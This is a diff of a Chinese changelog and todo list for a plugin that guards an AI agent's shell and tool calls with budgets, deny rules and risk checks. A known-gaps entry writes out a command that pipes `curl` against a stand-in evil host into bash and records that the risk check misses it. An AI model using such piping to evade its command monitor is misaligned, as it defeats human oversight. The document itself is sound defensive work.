@@ -40,7 +40,8 @@
 - [x] 修复「bash 全量报 `cannot get property "tools" without inject`」：`detectFileTools` 与 `registerCommandGuidance` 原先直接读 `ctx.tools`/`ctx.systemPrompt`，插件未声明 `inject` 时 cordis 代理在属性读取阶段即抛错，`tools/pre-execute` 的命令形态检查因此让所有 bash 调用失败（0.4.2 引入 `detectFileTools` 时回归）；改为优先 `ctx.get()`（无 inject 要求、取不到返回 `undefined`）并保留属性读取兜底且包在 `try` 中，同时修复命令提示段落一直未注册的问题；`test.mjs` 增加严格上下文（属性读取即抛）的单元与端到端回归用例。
 - [x] 修复替代命令提示指错工具：`tools/pre-execute` 里 `detectFileTools(ctx)` 没传 scope，取到的是全局视图，看不到按 agent 作用域注册的 `ops_*`，于是文案退化成官方 `read`/`grep`/`glob`（部分会话根本没有 `read`）；改为 `detectFileTools(ctx, exec?.agent)`，与系统提示段落拿到的 `scope` 保持一致；`test.mjs` 增加「全局视图只有 `read`、agent 视图有 `ops_*` 时 deny 文案必须是 `ops_inspect_local_file`」回归用例。
 - [x] 压缩阈值配置可自检/可重放：新增 `scripts/apply-compaction.sh`（`check` 默认只读自检、`apply` 备份后按安装包 preset 重生成覆盖块并原位替换、`dry-run` 只预告），校验四个内置 preset 的 `compaction-basic` 三字段（`thresholdRatio/retainRatio/headroomTokens`），块与安装包不一致时报 FAIL 提示 DSH 升级漂移；保留宿主已有的 `maxOutputChars`；`test.mjs` 新增 fixture 语法/全 PASS/幂等/缺字段 FAIL/dry-run 不写盘用例；文档见 `docs/context-compaction.md` 5.5。
-- [x] 文档瘦身（2026-11-22）：中英 README 改为「先说最要紧的四件事（风险确认 > 去重 > 单轮 80/160 > 命令形态拦截）+ 全量功能列表」，长段落改成短句/列表/表格，合并重复的硬上限说明、精简 linuxops 章节；`package.json` 描述改成风险优先的一句话卖点，`market/person-clouds__dsh-context-guard.yml` 中英描述同步；修正英文 README 残留旧阈值（21/40 次 → 80/160 次）。npm 线上描述与市场条目要等下一次发布/PR 才更新。
+- [x] 核验态硬上限（2026-11-22）：会话标题命中 `sessionBudgets[].match`（默认 `^(?:TODO[：:]\s*)?V[：:]`）时自动切换预算 `25 提醒 / 40 硬拒 / 单轮 20000 chars`，并 `deny` `write`/`edit` 与装依赖、`git commit|push|add`、重启服务；标题由 `/V` 命令或手工改名设置，标题缓存 5 秒 TTL，非核验会话保持全局 `80/160/40000`；新增 `lib/verify-mode.js`（规则编译、指纹、派单登记）与 `turn-budget.budgetFor` 按会话覆盖；
+- [x] 重复派单硬拦（2026-11-22）：`subagent`/`subagent_fork`/`workflow` 的 prompt 声明「快照：`<sha>`」时，同会话同指纹 2 小时内第二次派单直接 `deny`（唯一能在 `tools/pre-execute` 拒绝的层就是本插件），prompt 含 `verify-again` 或未声明快照不拦；`test.mjs` 增加规则编译/标题匹配/指纹/窗口过期/去重与端到端用例。
 
 ## 待办
 
@@ -58,6 +59,7 @@
 | 10 | ~~重启后回放链接检查~~ | 已完成：2026-11-22 16:44:49 重启（PID 414812，晚于 `d725d4c`）。真实入口回放：`cat <<'EOF' \| env bash` 正文含未放行链接 → 弹出 `context-guard risk check (medium): unknown-link, insecure-http`（修前静默放过）；白名单内 `curl http://192.168.31.244:2283/api/health` 放行无卡；整文件 `cat` 仍被 lint 拦。见验证记录 2026-11-22 17:05 |
 | 11 | 文本经管道喂给 shell 的漏报 | `printf 'curl http://evil.example' \| bash`、`echo "$CMD" \| bash` 仍判 `none`（重启后实测无卡）：字面量文本进 shell 后不做二次解析。属已知边界；如需覆盖，按「管道上一段的字面量参数当作一段命令递归分析」实现（注意自引用循环与成本）。`PLAN-risk-link-scope.md` 的 15:58 已订正为 15:43 |
 | 12 | host 规则命中仍弹一次卡 | 2026-11-22 16:49 观察：`unknown.example` 已在 `risk-allow.json`，`curl http://unknown.example/x` 仍弹卡且 reason 带 `rule-token`、决策 `allowed-once`。离线 `filterRiskByRules` 判定为已放行，疑似运行期规则加载时序；不影响安全性，待复现时确认 |
+| 13 | 核验态与派单去重实机验证 | 需重启 DSH 后：把会话标题改成 `V: 测试`，确认 `write`/`npm install` 被 `deny`、第 25 次 bash 提醒、第 40 次硬拒；同一 prompt 带「快照：`abc1234`」连派两次 `subagent`，第二次应 `deny` 且加 `verify-again` 可放行 |
 
 ## 验证记录
 
